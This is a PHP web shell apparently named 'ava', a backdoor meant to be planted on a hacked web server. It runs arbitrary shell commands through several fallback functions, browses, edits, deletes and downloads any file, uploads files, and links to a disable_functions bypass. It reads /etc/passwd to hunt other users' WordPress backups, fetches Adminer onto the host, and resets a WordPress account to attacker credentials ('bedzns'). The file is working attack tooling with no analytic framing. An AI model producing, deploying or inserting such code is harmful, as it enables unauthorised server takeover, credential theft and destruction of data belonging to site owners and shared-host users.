<?php
function exect($cmd) { 	
if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$exect = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $exect; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$exect = ""; 		
		foreach($results as $result) { 			
			$exect .= $result; 		
		} return $exect; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$exect = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $exect; 	
	} elseif(function_exists('shell_exec')) { 		
		$exect = @shell_exec($cmd); 		
		return $exect; 	
	} 
}


function fperms($filen) {
$perms = fileperms($filen);
$fpermsinfo .= (($perms & 0x0100) ? 'r' : '-');
$fpermsinfo .= (($perms & 0x0080) ? 'w' : '-');
$fpermsinfo .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));
$fpermsinfo .= (($perms & 0x0020) ? 'r' : '-');
$fpermsinfo .= (($perms & 0x0010) ? 'w' : '-');
$fpermsinfo .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));
$fpermsinfo .= (($perms & 0x0004) ? 'r' : '-');
$fpermsinfo .= (($perms & 0x0002) ? 'w' : '-');
$fpermsinfo .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));
echo '<center><small>'.$fpermsinfo.'</small></center>';
}

?>
<title>Avaa</title>
<link href='//fonts.googleapis.com/css?family=Share+Tech+Mono' rel='stylesheet' type='text/css'>
<style type="text/css">
	body {
		font-family: courier;
		background: #f2f2f2;
		font-size: 1px;
	}
	h1 a {
		font-weight: normal;
		font-family: 'Share Tech Mono';
		font-size: 20px;
		color:#006600;
		text-decoration: none;
		margin: 0px;
	}
	h2 {
		font-size: 20px;
		color: #006600;
		text-align: center;
		padding-top: 5px;
		margin: 0;
		margin-top: 10px;
	}
	.menu {
		text-align: center;
		font-size: 12px;
		border-bottom: 1px dashed #006600;
		padding-bottom: 5px;
		margin-bottom: 10px;
	}
	.menu a {
		margin-top: 2px;
		color: #006600;
		text-decoration: none;
		display: inline-block;
	}
	.container {
		font-size: 12px;
	}
	.filemgr {
		font-size: 12px;
		width: 100%
	}
	.filemgr td {
		padding: 3px;
		border-bottom: 1px dashed #006600;
	}
	.filemgr a{
		text-decoration: none;
		color:#006600;
	}
	tr:hover {
		background: #cccccc;
	}
	.tdtl {
		background:#006600;color:#ffffff;text-align:center;font-weight:bold;
	}
	.footer {
		text-align: center;
		border-radius: 30px;
		margin-top: 25px;
		border-top: 1px double #006600;
		padding: 5px;
	}
	.footer a {
		color: #006600;
		text-decoration: none;
	}
	p {
    	word-wrap: break-word;
    	margin:2;
	}
	a {
		text-decoration: none;
		color: #006600;
	}
	.act {
		text-align: center;
	}
	.txarea {
		width:100%;
		height:200px;
		background:transparent;
		border:1px solid #006600;
		padding:1px;color:#006600;
	}
</style>
<div class="container">
<div style="position:relative;width: 100%;margin-bottom: 5px;border-bottom: 1px dashed #006600;">
	<div style="float: left;width: 15%;text-align: center;border: 1px dashed #006600;margin-bottom: 5px;">
	<h1><a href="?">ava<br></a></h1>
	</div>
	<div style="float: right;width: 83%;">
	<?php
		echo php_uname();
		$mysql = (function_exists('mysql_connect')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
		$curl = (function_exists('curl_version')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
		$wget = (exect('wget --help')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
		$perl = (exect('perl --help')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
		$gcc = (exect('gcc --help')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
		$disfunc = @ini_get("disable_functions");
		$show_disf = (!empty($disfunc)) ? "<font color=red>$disfunc</font> <a href='?bypass=killdiscfunc' style='text-decoration:none;color:#0000FF;font-weight: bold;'>[ KILL ME ]</a>" : "<font color=#006600>NONE</font>";
		echo '<br>[ MySQL: '.$mysql.' ][ Curl: '.$curl.' ][ Wget: '.$wget.' ][ Perl: '.$perl.' ][ Compiler: '.$gcc.' ]';
		echo '<p>Disable Function: '.$show_disf;

	?>
	</div>
	<div style="clear: both;" ="clear"></div>
</div>

<?php

if(empty($_GET)) {
	$dir = getcwd();
}
else {
	$dir = $_GET['path'];
}

if(!empty($_GET['path'])) {$offdir = $_GET['path'];}
else if(!empty($_GET['file'])) {$offdir = dirname($_GET['file']);}
else if(!empty($_GET['lastpath'])) {$offdir = $_GET['lastpath'];}
else {$offdir = getcwd();}

?>
<div class="menu">	
<a href="?ext=backupwordpress&lastpath=<?php echo $offdir;?>">[ Jumping Backup Wordpress ]</a>
<a href="?ext=sql_interface&lastpath=<?php echo $offdir;?>">[ MySQL Interface ]</a>
<a href="?ext=shellcmd&lastpath=<?php echo $offdir;?>">[ Shell Command ]</a>
<a href="?ext=uploader&lastpath=<?php echo $offdir;?>">[ Uploader ]</a>
</div>
<?php
## CURRENT DIR ##

echo '<div style="margin-bottom:10px;">';
echo '<span style="border:1px dashed #009900;padding:2px;">';
$lendir = str_replace("\\","/",$offdir);
$xlendir = explode("/", $lendir);
foreach($xlendir as $c_dir => $cdir) {	
	echo "<a href='?path=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $xlendir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo '</span></div>';
## EOF CURRENT DIR ##

if(!empty($dir)) {
echo '<table class="filemgr">';
echo '<tr><td class="tdtl">Name</td><td class="tdtl" width="9%">Permission</td><td class="tdtl" width="18%">Action</td></tr>'."\n";
$directories = array();
$files_list  = array();
$files = scandir($dir);
foreach($files as $file){
   if(($file != '.') && ($file != '..')){
      if(is_dir($dir.'/'.$file)){
         $directories[] = $file;

      } else{
         $files_list[] = $file;

      }
   }
}

foreach($directories as $directory){
	echo '<tr><td><span class="dbox">[D]</span> <a href="?path='.$dir.'/'.$directory.'">'.$directory.'/</a></td>'."\n";
	echo '<td>';
	fperms($dir.'/'.$directory);
	echo '</td>'."\n";
	echo '<td class="act">';
	echo '<a href="?action=rename&file='.$dir.'/'.$directory.'" class="act">RENAME</a> ';
	echo '<a href="?action=rmdir&file='.$dir.'/'.$directory.'" class="act">DELETE</a>';
	echo '</td>'."\n";
	echo '</tr>'."\n";
}
foreach($files_list as $filename){
	if(preg_match('/(tar.gz)$/', $filename)) {
		echo '<tr><td><span class="dbox">[F]</span> <a href="#" class="act">'.$filename.'</a>'."\n";
		echo ' <a href="?ext=extract2tmp&gzname='.$dir.'/'.$filename.'" style="background:#006600;color:#ffffff;padding:1px;padding-left:5px;padding-right:5px;">EXTRACT TO TMP</a>';
		echo '</td>'."\n";
		echo '<td>';
		fperms($dir.'/'.$filename);
		echo '</td>'."\n";
		echo '<td class="act">';
		echo '<a href="?action=rename&file='.$dir.'/'.$filename.'" class="act">RENAME</a> ';
		echo '<a href="?action=delete&file='.$dir.'/'.$filename.'" class="act">DELETE</a> ';
		echo '<a href="?action=download&file='.$dir.'/'.$filename.'" class="act">DOWNLOAD</a>';
		echo '</td>'."\n";
		echo '</tr>'."\n";
	} 
	else {
		echo '<tr><td><span class="dbox">[F]</span> <a href="?action=view&file='.$dir.'/'.$filename.'" class="act">'.$filename.'</a></td>'."\n";
		echo '<td>';
		fperms($dir.'/'.$filename);
		echo '</td>'."\n";
		echo '<td class="act">';
		echo '<a href="?action=edit&file='.$dir.'/'.$filename.'" class="act">EDIT</a> ';
		echo '<a href="?action=rename&file='.$dir.'/'.$filename.'" class="act">RENAME</a> ';
		echo '<a href="?action=delete&file='.$dir.'/'.$filename.'" class="act">DELETE</a> ';
		echo '<a href="?action=download&file='.$dir.'/'.$filename.'" class="act">DOWNLOAD</a>';
		echo '</td>'."\n";
		echo '</tr>'."\n";
	}
}
echo '</table>';
}


if($_GET['action'] == 'edit') {
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$act = "<font color=#006600>Successed!</font>";
		} else {
			$act = "<font color=red>Permission Denied!</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=#006600>".basename($_GET['file'])."</font>";
	echo "<form method='post'>
	<textarea name='src' class='txarea'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' value='Save' name='save' style='width: 20%;background:#006600;border:none;color:#f2f2f2;margin-top:5px;height:30px;'>
	</form>";
}
else if($_GET['action'] == 'view') {
	echo "Filename: <font color=#006600>".basename($_GET['file'])."</font>";
	echo "<textarea class='txarea' style='height:400px;' readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
}
else if($_GET['action'] == 'rename') {
	$path = $offdir;
	if($_POST['do_rename']) {
		$rename = rename($_GET['file'], "$path/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<font color=#006600>Successed!</font>";
		} else {
			$act = "<font color=red>Permission Denied!</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=#006600>".basename($_GET['file'])."</font>";
	echo "<form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
	<input type='submit' name='do_rename' value='rename'>
	</form>";
}
else if($_GET['action'] == 'delete') {
	$path = $offdir;
	$delete = unlink($_GET['file']);
	if($delete) {
		
	} else {
		$act = "<font color=red>Permission Denied!</font>";
	}
	echo $act;
} else if($_GET['action'] == 'rmdir') {
	$path = $offdir;
	$delete = rmdir($_GET['file']);
	if($delete) {
		echo '<font color=#006600>Deleted!</font><br>';
	} else {
		echo "\n<font color=#006600>Try Force Delete!</font>\n<br>";
		exect('rm -rf '.$_GET['file']);
		if(file_exists($_GET['file'])) {
			echo '<font color=red>Permission Denied!</font>';
		} else
		{
			echo '<font color=#006600>Deleted!</font>';
		}
	}

} else if($_GET['action'] == 'download') {
	@ob_clean();
	$file = $_GET['file'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.$file.'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
}

if($_GET['ext'] == 'backupwordpress') {
	echo '<h2>.::[ Jumping From Backup Wordpress ]::.</h2>';
		$i = 0;
		echo "<pre><div class='margin: 5px auto;'>";
		$etc = fopen("/etc/passwd", "r");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<center><font color=red>Can't read /etc/passwd</font></center>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user);
				foreach($user[1] as $users) {
					$user_dir = "/home/$users/backupwordpress";
					if(is_readable($user_dir)) {
						$i++;
						$jrw = "[R] <a href='?path=$user_dir'>/home/$users/backupwordpress</a>";
						if(is_writable($user_dir)) {
							$jrw = "[RW] <a href='?path=$user_dir'>/home/$users/backupwordpress</a>";
						}
						echo $jrw."\n";

					}
				}
			}
		}
		if($i == 0) { 
			echo '<center><font color=red>backupwordpress is null in this host!</font></center>';
		} else {
			echo "<br>Total ".$i." Users in ".gethostbyname($_SERVER['HTTP_HOST'])."";
		}
		echo "</div></pre>";
}

### EXTRACTOR TO TMP ###
else if($_GET['ext'] == 'extract2tmp')
{
	if (file_exists($_SERVER["DOCUMENT_ROOT"].'/tmp/') && is_writable($_SERVER["DOCUMENT_ROOT"].'/tmp/')) {
    	$tmppath = $_SERVER["DOCUMENT_ROOT"].'/tmp/';
	}
	else if(file_exists(dirname($_SERVER["DOCUMENT_ROOT"]).'/tmp/') && is_writable(dirname($_SERVER["DOCUMENT_ROOT"]).'/tmp/')) {
		$tmppath = dirname($_SERVER["DOCUMENT_ROOT"]).'/tmp/';
	}
	else if(file_exists('/tmp/') && is_writable('/tmp/')) {
		$tmppath = '/tmp/';
	}
	else {
		$tmppath = '';
	}

	if(!empty($tmppath)) {
		$gzfile = $_GET['gzname'];
		echo '[FILE] '.$gzfile.'<br>';
		echo '-- extract to --<br>';
		echo '[TMP] '.$tmppath.'<br>';
		$bsname = basename($gzfile);
		$gzrname = explode(".", $bsname);
		echo '<form method="post" action="">';
		echo '<input name="extract" type="submit" value="EXTRACT">';
		echo '</form>';
			if(!empty($_POST['extract'])) {
				exect('mkdir '.$tmppath.$gzrname[0]);
				$destdir = $tmppath.$gzrname[0];
				if (file_exists($destdir) && is_writable($destdir)) {
					echo "\n".'[EXTRACTED] <a href="?path='.$destdir.'">'.$destdir.'</a>'."\n";
					exect('tar -xzvf '.$gzfile.' -C '.$destdir);
				}
				else
				{
					echo 'FAILED!';
				}
			}
	}
	else {
		echo 'CANNOT EXTRACT TO TMP!';
	}

} 
### EXTRACTOR TO TMP - EOF ###

### CMD ###
else if($_GET['ext'] == 'shellcmd')
{
	echo '<h2>.::[ Shell Command ]::.</h2>';
	echo '<form method="post" action="">';
	echo 'terminal:~$ <input name="cmd" type="text" placeholder="echo avabyte" style="width:300px"/>';
	echo ' <input type="submit" value=">>"/>';
	echo '</form>';
	if(!empty($_POST['cmd'])) {
		echo '<textarea style="width:100%;height:150px;" readonly>';
			$cmd = $_POST['cmd'];
			echo exect($cmd);
		echo '</textarea>';
	}
}
### CMD EOF ###

### UPLOADER ###
else if($_GET['ext'] == 'uploader')
{
	echo '<h2>.::[ Uploader ]::.</h2>';
	echo '<center>';
	echo '<form method=post enctype=multipart/form-data>';
	echo '<br><br>PATH ['.$offdir.']<br>';
	echo '<input type="file" name="avafile"><input name="postupl" type="submit" value="Upload"><br>';
	echo '</form>';
	if($_POST["postupl"] == 'Upload')
	{
		if(@copy($_FILES["avafile"]["tmp_name"],"$offdir/".$_FILES["avafile"]["name"]))
			{ echo '<b>OK! '."$offdir/".$_FILES["avafile"]["name"].'</b>'; }
		else 
			{ echo '<b>Upload Failed.</b>'; }
	}
	echo '</center>';
}
### UPLOADER EOF ###

### MYSQL INTERFACE ###
else if($_GET['ext'] == 'sql_interface')
{
	echo '<h2>.::[ MySQL Interface ]::.</h2>';
	echo '<center>';
	$dwadminer = 'https://www.adminer.org/static/download/4.3.1/adminer-4.3.1.php';
	$fileadminer = 'z-adminer.php';
	function call_adminer($dwadminer, $fileadminer) {
		$fp = fopen($fileadminer, "w+");
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $dwadminer);
		curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	file_put_contents($dwadminer, $fileadminer);
	}
	echo '<form method=post enctype=multipart/form-data>';
	echo '<input name="mysql_int" type="submit" value="Call Adminer 4.3.1"><br>';
	echo '</form>';
	if($_POST['mysql_int'] == 'Call Adminer 4.3.1') {
	    call_adminer($dwadminer, $fileadminer);
	    $linkz = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
	    if(file_exists('z-adminer.php')) {
	    	echo '<a href="'.$linkz.dirname($_SERVER['PHP_SELF']).'/'.$fileadminer.'" target="_blank">Adminer OK!</a>';
	    }
	    else {
	    	echo '<font color="red">[FAILED]</a>';
	    } 

	}
	echo '</center>';
}
### MYSQL INTERFACE EOF ###


### TAMBAHAN BACKUPWORDPRESS BASH ###
if($_GET['grab'] == 'wp_options') {
	$userdb = $_POST['wpuser'];
	$passdb = $_POST['wppass'];
	$namedb = $_POST['wpdb'];
	$hostdb = $_POST['wphost'];
	echo 'WP_OPTIONS';
	if(!empty($userdb)) {
	$link = mysql_connect($hostdb, $userdb, $passdb);
	if (!$link) {die('Could not connect: ' . mysql_error());}
	if (!mysql_select_db($namedb)) {die('Could not select database: ' . mysql_error());}
	//
	$tblz = mysql_query("SELECT table_name FROM information_schema.tables WHERE table_schema='".$namedb."' AND table_name LIKE '%_options' LIMIT 1");
	if (!$tblz) {die('Could not query:' . mysql_error());}
	$tbl = mysql_result($tblz, 0, 'table_name'); // outputs third employee's name
	$result = mysql_query("SELECT option_value FROM ".$tbl." WHERE option_name = 'siteurl' AND option_id = '1'");
	if (!$result) {die('Tbl Could not query:' . mysql_error());}
	echo "\n".'[DOMAIN] '.mysql_result($result, 0, 'option_value')."\n"; // outputs third employee's name
	mysql_close($link);
	}
} else if($_GET['grab'] == 'wp_users_updt') {
	$userdb = $_POST['wpuser'];
	$passdb = $_POST['wppass'];
	$namedb = $_POST['wpdb'];
	$hostdb = $_POST['wphost'];
	$prefix = $_POST['tpfx'];
	echo 'WP_USERS';
		$conn = new mysqli($hostdb, $userdb, $passdb, $namedb);
		if ($conn->connect_error) {
		    die("Connection failed: " . $conn->connect_error);
		} 
		$sql = "UPDATE ".$prefix."users SET user_login = 'bedzns', user_pass = MD5('bedzns') WHERE user_status = '0' LIMIT 1";
		if ($conn->query($sql) === TRUE) {
		    echo "Record updated successfully";
		} else {
		    echo "Error updating record: " . $conn->error;
		}
		$conn->close();
}
### TAMBAHAN BACKUPWORDPRESS BASH EOF ###



### FOOTER ###
echo '<div class="footer">';
echo '</div>';
echo '</div>';
 ?>
